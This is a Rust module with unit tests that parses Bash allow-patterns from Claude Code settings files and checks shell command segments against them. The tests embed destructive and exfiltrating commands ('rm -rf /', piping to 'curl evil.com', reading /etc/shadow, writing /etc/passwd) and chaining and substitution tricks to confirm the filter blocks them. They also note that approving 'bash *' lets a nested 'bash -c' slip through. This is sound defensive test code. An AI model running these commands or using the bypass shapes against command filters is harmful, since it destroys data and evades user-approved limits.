use std::collections::HashSet;
use std::path::Path;

pub struct ApprovedPatterns {
    exact: HashSet<String>,
    globs: Vec<Vec<String>>,
}

impl ApprovedPatterns {
    pub fn load() -> Self {
        let mut patterns = ApprovedPatterns {
            exact: HashSet::new(),
            globs: Vec::new(),
        };

        if let Some(home) = std::env::var_os("HOME") {
            patterns.load_file(&Path::new(&home).join(".claude/settings.json"));
        }

        if let Some(project_dir) = std::env::var_os("CLAUDE_PROJECT_DIR") {
            let base = Path::new(&project_dir).join(".claude");
            patterns.load_file(&base.join("settings.json"));
            patterns.load_file(&base.join("settings.local.json"));
        }

        patterns
    }

    fn load_file(&mut self, path: &Path) {
        let Ok(contents) = std::fs::read_to_string(path) else {
            return;
        };
        let Ok(value) = serde_json::from_str::<serde_json::Value>(&contents) else {
            return;
        };

        if let Some(arr) = value.get("approved_commands").and_then(|v| v.as_array()) {
            for entry in arr.iter().filter_map(|e| e.as_str()) {
                self.add_pattern(entry);
            }
        }

        if let Some(arr) = value
            .get("permissions")
            .and_then(|v| v.get("allow"))
            .and_then(|v| v.as_array())
        {
            for entry in arr.iter().filter_map(|e| e.as_str()) {
                self.add_pattern(entry);
            }
        }
    }

    fn add_pattern(&mut self, entry: &str) {
        let Some(inner) = entry.strip_prefix("Bash(").and_then(|s| s.strip_suffix(')')) else {
            return;
        };
        if inner.is_empty() {
            return;
        }
        let normalized = if let Some(prefix) = inner.strip_suffix(":*") {
            format!("{prefix} *")
        } else {
            inner.to_string()
        };
        if normalized.contains('*') {
            self.globs
                .push(normalized.split('*').map(String::from).collect());
        } else {
            self.exact.insert(normalized);
        }
    }

    pub fn matches(&self, segment: &str) -> bool {
        let normalized = strip_fd_redirects(crate::parse::strip_env_prefix(segment).trim());
        if normalized.is_empty() {
            return false;
        }
        if self.exact.contains(normalized.as_str()) {
            return true;
        }
        self.globs
            .iter()
            .any(|parts| glob_matches(parts, &normalized))
    }

    pub fn is_empty(&self) -> bool {
        self.exact.is_empty() && self.globs.is_empty()
    }
}

fn strip_fd_redirects(s: &str) -> String {
    match crate::parse::tokenize(s) {
        Some(tokens) => tokens
            .into_iter()
            .filter(|t| !crate::is_fd_redirect(t))
            .collect::<Vec<_>>()
            .join(" "),
        None => s.to_string(),
    }
}

fn glob_matches(parts: &[String], text: &str) -> bool {
    let first = &parts[0];
    let last = &parts[parts.len() - 1];

    // "prefix *" → word boundary: prefix followed by space or end-of-string
    if parts.len() == 2 && last.is_empty() && first.ends_with(' ') {
        let prefix = &first[..first.len() - 1];
        return text == prefix || text.starts_with(first.as_str());
    }

    if !text.starts_with(first.as_str()) {
        return false;
    }
    if !text.ends_with(last.as_str()) {
        return false;
    }
    let mut pos = first.len();
    let end = text.len() - last.len();
    if pos > end {
        return false;
    }
    for part in &parts[1..parts.len() - 1] {
        match text[pos..end].find(part.as_str()) {
            Some(idx) => pos += idx + part.len(),
            None => return false,
        }
    }
    pos <= end
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;

    fn empty() -> ApprovedPatterns {
        ApprovedPatterns {
            exact: HashSet::new(),
            globs: Vec::new(),
        }
    }

    #[test]
    fn parse_exact_pattern() {
        let mut p = empty();
        p.add_pattern("Bash(npm test)");
        assert!(p.exact.contains("npm test"));
        assert!(p.globs.is_empty());
    }

    #[test]
    fn parse_legacy_colon_star() {
        let mut p = empty();
        p.add_pattern("Bash(npm run:*)");
        assert!(p.exact.is_empty());
        assert_eq!(p.globs.len(), 1);
    }

    #[test]
    fn parse_space_star() {
        let mut p = empty();
        p.add_pattern("Bash(npm run *)");
        assert!(p.exact.is_empty());
        assert_eq!(p.globs.len(), 1);
    }

    #[test]
    fn parse_star_no_space() {
        let mut p = empty();
        p.add_pattern("Bash(ls*)");
        assert_eq!(p.globs.len(), 1);
    }

    #[test]
    fn parse_star_at_beginning() {
        let mut p = empty();
        p.add_pattern("Bash(* --version)");
        assert_eq!(p.globs.len(), 1);
    }

    #[test]
    fn parse_star_in_middle() {
        let mut p = empty();
        p.add_pattern("Bash(git * main)");
        assert_eq!(p.globs.len(), 1);
    }

    #[test]
    fn parse_non_bash_skipped() {
        let mut p = empty();
        p.add_pattern("WebFetch");
        p.add_pattern("XcodeBuildMCP");
        assert!(p.is_empty());
    }

    #[test]
    fn parse_empty_bash_skipped() {
        let mut p = empty();
        p.add_pattern("Bash()");
        assert!(p.is_empty());
    }

    #[test]
    fn parse_empty_prefix_skipped() {
        let mut p = empty();
        p.add_pattern("Bash(:*)");
        assert!(p.exact.is_empty());
        assert_eq!(p.globs.len(), 1);
    }

    #[test]
    fn match_exact() {
        let mut p = empty();
        p.add_pattern("Bash(npm test)");
        assert!(p.matches("npm test"));
        assert!(!p.matches("npm test --watch"));
    }

    #[test]
    fn match_space_star_word_boundary() {
        let mut p = empty();
        p.add_pattern("Bash(ls *)");
        assert!(p.matches("ls -la"));
        assert!(p.matches("ls foo"));
        assert!(!p.matches("lsof"));
    }

    #[test]
    fn match_star_no_space_no_boundary() {
        let mut p = empty();
        p.add_pattern("Bash(ls*)");
        assert!(p.matches("ls -la"));
        assert!(p.matches("lsof"));
    }

    #[test]
    fn match_legacy_colon_star_word_boundary() {
        let mut p = empty();
        p.add_pattern("Bash(npm run:*)");
        assert!(p.matches("npm run build"));
        assert!(p.matches("npm run test"));
        assert!(!p.matches("npm running"));
        assert!(!p.matches("npm install"));
    }

    #[test]
    fn match_star_at_beginning() {
        let mut p = empty();
        p.add_pattern("Bash(* --version)");
        assert!(p.matches("npm --version"));
        assert!(p.matches("cargo --version"));
        assert!(!p.matches("npm --help"));
    }

    #[test]
    fn match_star_in_middle() {
        let mut p = empty();
        p.add_pattern("Bash(git * main)");
        assert!(p.matches("git checkout main"));
        assert!(p.matches("git merge main"));
        assert!(!p.matches("git checkout develop"));
    }

    #[test]
    fn match_env_prefix_stripped() {
        let mut p = empty();
        p.add_pattern("Bash(bundle install)");
        assert!(p.matches("RACK_ENV=test bundle install"));
    }

    #[test]
    fn match_fd_redirect_stripped() {
        let mut p = empty();
        p.add_pattern("Bash(npm test)");
        assert!(p.matches("npm test 2>&1"));
    }

    #[test]
    fn match_fd_redirect_with_glob() {
        let mut p = empty();
        p.add_pattern("Bash(npm run *)");
        assert!(p.matches("npm run test 2>&1"));
    }

    #[test]
    fn match_empty_segment() {
        let mut p = empty();
        p.add_pattern("Bash(npm test)");
        assert!(!p.matches(""));
        assert!(!p.matches("  "));
    }

    #[test]
    fn empty_patterns_match_nothing() {
        let p = empty();
        assert!(!p.matches("anything"));
    }

    #[test]
    fn match_bare_star_matches_everything() {
        let mut p = empty();
        p.add_pattern("Bash(*)");
        assert!(p.matches("anything at all"));
        assert!(p.matches("rm -rf /"));
    }

    #[test]
    fn unsafe_syntax_not_bypassed_by_match() {
        let mut p = empty();
        p.add_pattern("Bash(./script.sh *)");
        let segment = "./script.sh > /etc/passwd";
        assert!(crate::parse::has_unsafe_shell_syntax(segment));
        let covered = crate::is_safe(segment)
            || (!crate::parse::has_unsafe_shell_syntax(segment) && p.matches(segment));
        assert!(!covered);
    }

    #[test]
    fn command_substitution_not_bypassed_by_match() {
        let mut p = empty();
        p.add_pattern("Bash(./script.sh *)");
        let segment = "./script.sh $(rm -rf /)";
        let covered = crate::is_safe(segment)
            || (!crate::parse::has_unsafe_shell_syntax(segment) && p.matches(segment));
        assert!(!covered);
    }

    #[test]
    fn mixed_chain_safe_plus_settings() {
        let mut p = empty();
        p.add_pattern("Bash(./generate-docs.sh)");
        let command = "cargo test && ./generate-docs.sh";
        let segments = crate::parse::split_outside_quotes(command);
        let all_covered = segments.iter().all(|s| {
            crate::is_safe(s)
                || (!crate::parse::has_unsafe_shell_syntax(s) && p.matches(s))
        });
        assert!(all_covered);
    }

    #[test]
    fn mixed_chain_safe_plus_unapproved_denied() {
        let mut p = empty();
        p.add_pattern("Bash(./generate-docs.sh)");
        let command = "cargo test && rm -rf /";
        let segments = crate::parse::split_outside_quotes(command);
        let all_covered = segments.iter().all(|s| {
            crate::is_safe(s)
                || (!crate::parse::has_unsafe_shell_syntax(s) && p.matches(s))
        });
        assert!(!all_covered);
    }

    fn is_covered(segment: &str, patterns: &ApprovedPatterns) -> bool {
        crate::is_safe(segment)
            || (!crate::parse::has_unsafe_shell_syntax(segment) && patterns.matches(segment))
    }

    #[test]
    fn glob_does_not_cross_chain_boundary() {
        let mut p = empty();
        p.add_pattern("Bash(cargo test *)");
        let command = "cargo test --release && rm -rf /";
        let segments = crate::parse::split_outside_quotes(command);
        assert_eq!(segments.len(), 2);
        assert!(p.matches(&segments[0]));
        assert!(!p.matches(&segments[1]));
        assert!(!segments.iter().all(|s| is_covered(s, &p)));
    }

    #[test]
    fn glob_does_not_cross_pipe_boundary() {
        let mut p = empty();
        p.add_pattern("Bash(safe-cmd *)");
        let command = "safe-cmd arg | curl evil.com";
        let segments = crate::parse::split_outside_quotes(command);
        assert_eq!(segments.len(), 2);
        assert!(!segments.iter().all(|s| is_covered(s, &p)));
    }

    #[test]
    fn glob_does_not_cross_semicolon_boundary() {
        let mut p = empty();
        p.add_pattern("Bash(safe-cmd *)");
        let command = "safe-cmd arg; rm -rf /";
        let segments = crate::parse::split_outside_quotes(command);
        assert_eq!(segments.len(), 2);
        assert!(!segments.iter().all(|s| is_covered(s, &p)));
    }

    #[test]
    fn bare_star_blocked_by_unsafe_syntax_redirect() {
        let mut p = empty();
        p.add_pattern("Bash(*)");
        assert!(p.matches("echo > /etc/passwd"));
        assert!(!is_covered("echo > /etc/passwd", &p));
    }

    #[test]
    fn bare_star_blocked_by_unsafe_syntax_backtick() {
        let mut p = empty();
        p.add_pattern("Bash(*)");
        assert!(!is_covered("echo `rm -rf /`", &p));
    }

    #[test]
    fn bare_star_blocked_by_unsafe_syntax_command_sub() {
        let mut p = empty();
        p.add_pattern("Bash(*)");
        assert!(!is_covered("echo $(cat /etc/shadow)", &p));
    }

    #[test]
    fn nested_shell_not_recursively_validated_by_settings() {
        let mut p = empty();
        p.add_pattern("Bash(bash *)");
        let segment = "bash -c 'safe-cmd && rm -rf /'";
        assert!(!crate::is_safe(segment));
        assert!(!crate::parse::has_unsafe_shell_syntax(segment));
        // Settings match overrides recursive shell validation — this is by design.
        // The user explicitly approved Bash(bash *), which includes any bash -c command.
        // This mirrors Claude Code's own behavior for approved patterns.
        assert!(is_covered(segment, &p));
    }

    #[test]
    fn nested_shell_redirect_still_blocked() {
        let mut p = empty();
        p.add_pattern("Bash(bash *)");
        let segment = "bash -c 'echo hello' > /tmp/pwned";
        assert!(crate::parse::has_unsafe_shell_syntax(segment));
        assert!(!is_covered(segment, &p));
    }

    #[test]
    fn quoted_operators_stay_as_one_segment() {
        let mut p = empty();
        p.add_pattern("Bash(./script *)");
        let command = "./script 'arg && rm -rf /'";
        let segments = crate::parse::split_outside_quotes(command);
        assert_eq!(segments.len(), 1);
        assert!(is_covered(&segments[0], &p));
    }

    #[test]
    fn load_file_nonexistent() {
        let mut p = empty();
        p.load_file(Path::new("/nonexistent/path/settings.json"));
        assert!(p.is_empty());
    }

    #[test]
    fn load_file_malformed_json() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("settings.json");
        fs::write(&path, "not json{{{").unwrap();
        let mut p = empty();
        p.load_file(&path);
        assert!(p.is_empty());
    }

    #[test]
    fn load_file_approved_commands() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("settings.json");
        fs::write(
            &path,
            r#"{"approved_commands":["Bash(npm test)","Bash(npm run *)","WebFetch"]}"#,
        )
        .unwrap();
        let mut p = empty();
        p.load_file(&path);
        assert!(p.matches("npm test"));
        assert!(p.matches("npm run build"));
        assert!(!p.matches("curl evil.com"));
    }

    #[test]
    fn load_file_permissions_allow() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("settings.json");
        fs::write(
            &path,
            r#"{"permissions":{"allow":["Bash(cargo test *)","Bash(cargo clippy *)"]}}"#,
        )
        .unwrap();
        let mut p = empty();
        p.load_file(&path);
        assert!(p.matches("cargo test"));
        assert!(p.matches("cargo clippy -- -D warnings"));
    }

    #[test]
    fn load_file_both_fields() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("settings.json");
        fs::write(
            &path,
            r#"{"approved_commands":["Bash(npm test)"],"permissions":{"allow":["Bash(cargo test *)"]}}"#,
        )
        .unwrap();
        let mut p = empty();
        p.load_file(&path);
        assert!(p.matches("npm test"));
        assert!(p.matches("cargo test --release"));
    }
}
